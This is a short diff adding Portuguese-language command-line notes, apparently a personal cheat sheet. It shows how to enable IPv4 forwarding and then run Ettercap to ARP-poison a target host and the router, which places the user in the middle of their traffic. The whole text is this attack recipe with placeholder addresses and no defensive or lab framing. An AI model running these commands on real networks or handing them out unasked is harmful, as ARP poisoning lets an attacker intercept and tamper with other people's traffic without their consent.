@@ -1,0 +1,9 @@
+Linha de Comando:
+
+Ativando o IP Forward:
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Arp Poisoning com Ettercap:
+
+# ettercap -T -i <interface> -q -M arp /<ip do alvo>// /<ip do router>//
